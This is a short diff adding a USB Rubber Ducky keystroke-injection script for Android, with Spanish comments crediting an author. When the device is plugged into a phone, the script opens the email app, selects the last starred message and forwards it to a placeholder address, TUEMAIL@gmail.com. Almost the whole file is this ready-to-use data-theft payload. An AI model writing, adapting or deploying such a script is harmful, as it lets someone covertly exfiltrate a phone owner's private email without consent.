@@ -1,0 +1,24 @@
+REM Envia el ultimo email marcado como favorito a tu dirección. Script para Android creado por Sergigm87
+REM Rubby Ducky para Android
+DELAY 1000
+GUI e
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+CTRL r
+DELAY 500
+TAB
+DELAY 500
+SHIFT TAB
+ENTER
+DELAY 500
+BACKSPACE
+DELAY 500
+STRING TUEMAIL@gmail.com
+CTRL ENTER
